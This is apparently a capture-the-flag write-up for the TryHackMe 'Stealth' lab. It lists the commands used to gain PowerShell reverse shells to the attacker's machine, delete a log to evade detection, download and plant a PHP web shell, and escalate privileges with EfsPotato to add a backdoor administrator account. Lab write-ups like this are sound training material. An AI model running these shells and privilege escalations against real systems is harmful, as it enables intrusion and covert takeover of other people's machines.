# Stealth

**Room Link:** [https://tryhackme.com/r/room/stealth](https://tryhackme.com/r/room/stealth)



## **Scans** <a href="#scans" id="scans"></a>

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1013).png" alt=""><figcaption></figcaption></figure>



Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1014).png" alt=""><figcaption></figcaption></figure>

## **TCP/8000 - HTTPS**

**Kali**

```
```

## **TCP/8080 - HTTPS**

<figure><img src="../../.gitbook/assets/image (1015).png" alt=""><figcaption></figcaption></figure>

## **Initial Shell**

**Kali**

```
rlwrap nc -lvnp 4444
```

### **Shell #1 attempt**

This shell didn't work

**Kali**

```
git clone https://github.com/samratashok/nishang.git
cd nishang/Shells/
subl Invoke-PowerShellTcp.ps1
```

**Kali(subl)**

```
Invoke-PowerShellTcp -Reverse -IPAddress $KALI -Port 4444
```

### **Shell #2 attempt**

This shell worked

**Kali**

```
git clone https://github.com/martinsohn/PowerShell-reverse-shell.git
cd PowerShell-reverse-shell/
subl powershell-reverse-shell.ps1
```

**Change this line to Kali IP**

**Kali(subl)**

```
Net.Sockets.TCPClient('$KALI', 4444)
```

<figure><img src="../../.gitbook/assets/image (1016).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
cd C:\Users\evader\Desktop
dir
type encodedflag
```

<figure><img src="../../.gitbook/assets/image (1017).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
echo WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDovLzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5waHA= | base64 --decode
```

<figure><img src="../../.gitbook/assets/image (1018).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1019).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
cd C:\xampp\htdocs\uploads
del log.txt
```

refresh the page and we can see the flag now.

<figure><img src="../../.gitbook/assets/image (1021).png" alt=""><figcaption></figcaption></figure>



## **Lateral Movement**

Going by privs we don't have much but since we have web I tried adding a new shell and seeing if we get anything from it.

**Victim**

```
whoami /priv
```

<figure><img src="../../.gitbook/assets/image (1022).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
git clone https://github.com/flozz/p0wny-shell.git
cd p0wny-shell/ 
python2 -m SimpleHTTPServer 82
```

**Victim**

```
cd C:\xampp\htdocs
iwr -uri "http://$KALI:82/shell.php" -o shell.php
```

<figure><img src="../../.gitbook/assets/image (1023).png" alt=""><figcaption></figcaption></figure>

Even though we're the same user this shell has SeImpersonatePrivilege enabled

<figure><img src="../../.gitbook/assets/image (1024).png" alt=""><figcaption></figcaption></figure>

### **Privilege Escalation**&#x20;

I tried printspoofer but I couldn't execute the exe.

### **Attempt #1**

**Kali**

```
git clone https://github.com/dievus/printspoofer
cd printspoofer/
python2 -m SimpleHTTPServer 82
```

**Victim**

```
cd C:\Users\evader\Desktop
iwr -uri "http://$KALI:82/PrintSpoofer.exe" -o PrintSpoofer.exe
PrintSpoofer.exe -i -c whoami
```

### Attempt #2

We can see a EFI folder so looks like a clue on what to do.

**Victim**

```
cd C:\
dir
```

<figure><img src="../../.gitbook/assets/image (1027).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
git clone https://github.com/zcgonvh/EfsPotato.git
cd EfsPotato/
python2 -m SimpleHTTPServer 82
```

**Victim**

```
iwr -uri "http://10.10.252.180:82/EfsPotato.cs" -o efs.cs
```

**Victim(p0wny-shell)**

```
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe efs.cs -nowarn:1691,618
efs.exe "cmd.exe /c net user user password@123 /add && net localgroup administrators user /add"
```

**Kali**

```
remmina
Username: user
Password: password@123
```

<figure><img src="../../.gitbook/assets/image (1026).png" alt=""><figcaption></figcaption></figure>















